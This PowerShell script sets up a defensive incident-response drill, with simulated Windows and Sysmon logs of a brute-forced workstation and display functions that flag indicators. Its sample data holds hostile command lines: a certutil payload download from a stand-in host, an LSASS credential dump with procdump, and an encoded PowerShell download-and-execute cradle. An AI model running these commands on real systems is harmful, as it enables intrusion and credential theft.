# Windows Event Log Analysis Drill - Data and Functions

$global:DrillAuthEvents = @(
    @{Id=4625; Time="14:23:01"; User="jdavis"; IP="203.0.113.44"; Type=3; Msg="FAILED"}
    @{Id=4625; Time="14:23:02"; User="jdavis"; IP="203.0.113.44"; Type=3; Msg="FAILED"}
    @{Id=4625; Time="14:23:04"; User="jdavis"; IP="203.0.113.44"; Type=3; Msg="FAILED"}
    @{Id=4625; Time="14:25:00"; User="jdavis"; IP="203.0.113.44"; Type=3; Msg="FAILED"}
    @{Id=4625; Time="14:30:00"; User="jdavis"; IP="203.0.113.44"; Type=3; Msg="FAILED"}
    @{Id=4625; Time="14:44:55"; User="jdavis"; IP="203.0.113.44"; Type=3; Msg="FAILED"}
    @{Id=4624; Time="14:47:23"; User="jdavis"; IP="203.0.113.44"; Type=3; Msg="SUCCESS"}
    @{Id=4672; Time="14:47:23"; User="jdavis"; IP="203.0.113.44"; Type=3; Msg="Special privileges assigned (SeDebugPrivilege, SeImpersonatePrivilege)"}
)

$global:DrillProcessEvents = @(
    @{Time="14:47:45"; Process="cmd.exe";        Parent="explorer.exe"; Path="C:\Windows\System32\cmd.exe";                  Cmdline="cmd.exe /c whoami"; Suspicious=$false}
    @{Time="14:47:52"; Process="net.exe";         Parent="cmd.exe";       Path="C:\Windows\System32\net.exe";                  Cmdline="net localgroup administrators"; Suspicious=$true}
    @{Time="14:48:01"; Process="certutil.exe";    Parent="cmd.exe";       Path="C:\Windows\System32\certutil.exe";             Cmdline='certutil.exe -urlcache -f http://203.0.113.44/payload.exe C:\ProgramData\upd.exe'; Suspicious=$true}
    @{Time="14:48:45"; Process="upd.exe";         Parent="cmd.exe";       Path="C:\ProgramData\upd.exe";                       Cmdline="upd.exe --install --silent"; Suspicious=$true}
    @{Time="14:49:10"; Process="procdump.exe";    Parent="cmd.exe";       Path="C:\Windows\Temp\procdump.exe";                 Cmdline="procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp"; Suspicious=$true}
    @{Time="14:52:00"; Process="powershell.exe";  Parent="upd.exe";       Path="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"; Cmdline='powershell.exe -EncodedCommand SQBFAFgA...'; Suspicious=$true}
)

$global:DrillPersistenceEvents = @(
    @{Type="Service"; Time="14:50:15"; Name="WinUpdateSvc"; Path="C:\ProgramData\upd.exe"; Account="LocalSystem"; EventId=7045}
    @{Type="ScheduledTask"; Time="14:50:22"; Name="\MicrosoftUpdateTask"; Action='powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgA...'; EventId=4698}
    @{Type="LogCleared"; Time="15:22:10"; User="jdavis"; EventId=1102}
)

$global:DrillSysmonEvents = @(
    @{Id=10; Time="14:49:10"; Source="procdump.exe"; Target="lsass.exe"; Access="0x1010"; Note="PROCESS_VM_READ - credential dump!"}
    @{Id=3;  Time="14:48:01"; Process="certutil.exe"; Remote="203.0.113.44:80"; Note="certutil downloading payload"}
    @{Id=1;  Time="14:52:00"; Process="powershell.exe"; Parent="upd.exe"; Note="Encoded PS spawned by malware"}
)

function Show-AuthEvents {
    Write-Host "`n=== Authentication Events (Event IDs 4624/4625) ===" -ForegroundColor Cyan
    Write-Host "  Workstation: FINANCE-WS-04  Domain: CORP" -ForegroundColor DarkGray
    Write-Host ("{0,-12} {1,-7} {2,-15} {3,-16} {4,-8} {5}" -f "Time","EventID","User","IP","Type","Status") -ForegroundColor White
    Write-Host ("-" * 80) -ForegroundColor DarkGray
    $global:DrillAuthEvents | ForEach-Object {
        $color = if ($_.Msg -eq "SUCCESS") { "Red" } elseif ($_.Id -eq 4625) { "Yellow" } else { "White" }
        $typeStr = @{2="Interactive";3="Network";10="RDP"}[$_.Type]
        Write-Host ("{0,-12} {1,-7} {2,-15} {3,-16} {4,-8} {5}" -f $_.Time, $_.Id, $_.User, $_.IP, $typeStr, $_.Msg) -ForegroundColor $color
    }
    $failures = ($global:DrillAuthEvents | Where-Object {$_.Id -eq 4625}).Count
    Write-Host "`n  Total failed logons: $failures" -ForegroundColor Yellow
}

function Show-ProcessEvents {
    param([string]$After = "00:00:00")
    Write-Host "`n=== Process Creation Events (Event ID 4688 + Sysmon 1) ===" -ForegroundColor Cyan
    $global:DrillProcessEvents | Where-Object { $_.Time -gt $After } | ForEach-Object {
        $color = if ($_.Suspicious) { "Red" } else { "Gray" }
        Write-Host "  $($_.Time) $($_.Process)" -ForegroundColor $color -NoNewline
        Write-Host " (parent: $($_.Parent))"
        Write-Host "    CMD: $($_.Cmdline)" -ForegroundColor $(if($_.Suspicious){"DarkRed"}else{"DarkGray"})
        if ($_.Suspicious) {
            switch ($_.Process) {
                "certutil.exe" { Write-Host "    *** LOLBin: certutil used for file download! ***" -ForegroundColor Red }
                "procdump.exe" { Write-Host "    *** Credential dump: procdump targeting LSASS! ***" -ForegroundColor Red }
                "powershell.exe" { Write-Host "    *** Encoded PowerShell command — decode to analyze! ***" -ForegroundColor Red }
            }
        }
        Write-Host ""
    }
}

function Show-PersistenceEvents {
    Write-Host "`n=== Persistence Events ===" -ForegroundColor Cyan
    $global:DrillPersistenceEvents | ForEach-Object {
        $color = if ($_.Type -eq "LogCleared") { "DarkRed" } else { "Red" }
        Write-Host "  [$($_.EventId)] $($_.Time) Type: $($_.Type)" -ForegroundColor $color
        switch ($_.Type) {
            "Service" {
                Write-Host "    Name: $($_.Name)"
                Write-Host "    Path: $($_.Path)  (NOT in system32!)" -ForegroundColor Red
                Write-Host "    Account: $($_.Account)"
            }
            "ScheduledTask" {
                Write-Host "    Name: $($_.Name)"
                Write-Host "    Action: $($_.Action)" -ForegroundColor Red
                Write-Host "    Encoded command — use Decode-Base64 to read!" -ForegroundColor Yellow
            }
            "LogCleared" {
                Write-Host "    User: $($_.User) cleared the Security audit log!" -ForegroundColor DarkRed
                Write-Host "    ANTI-FORENSICS INDICATOR" -ForegroundColor Red
            }
        }
        Write-Host ""
    }
}

function Show-SysmonEvents {
    param([string]$Filter = "")
    Write-Host "`n=== Sysmon Events ===" -ForegroundColor Cyan
    $global:DrillSysmonEvents | Where-Object { $_.Target -match $Filter -or $_.Process -match $Filter -or $Filter -eq "" } | ForEach-Object {
        Write-Host "  Sysmon $($_.Id): $($_.Time)" -ForegroundColor Red
        switch ($_.Id) {
            10 { Write-Host "    ProcessAccess: $($_.Source) → $($_.Target)  GrantedAccess: $($_.Access)" -ForegroundColor Red }
            3  { Write-Host "    NetworkConnect: $($_.Process) → $($_.Remote)" -ForegroundColor Yellow }
            1  { Write-Host "    ProcessCreate: $($_.Process) (Parent: $($_.Parent))" -ForegroundColor Yellow }
        }
        Write-Host "    Note: $($_.Note)" -ForegroundColor DarkYellow
        Write-Host ""
    }
}

function Decode-Base64 {
    param([string]$Encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADQALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA=")
    $decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Encoded))
    Write-Host "Decoded: $decoded" -ForegroundColor Yellow
}

Write-Host "Windows Analysis Drill data loaded." -ForegroundColor Green
Write-Host "Commands: Show-AuthEvents, Show-ProcessEvents [-After HH:MM:SS], Show-PersistenceEvents, Show-SysmonEvents [-Filter term], Decode-Base64"
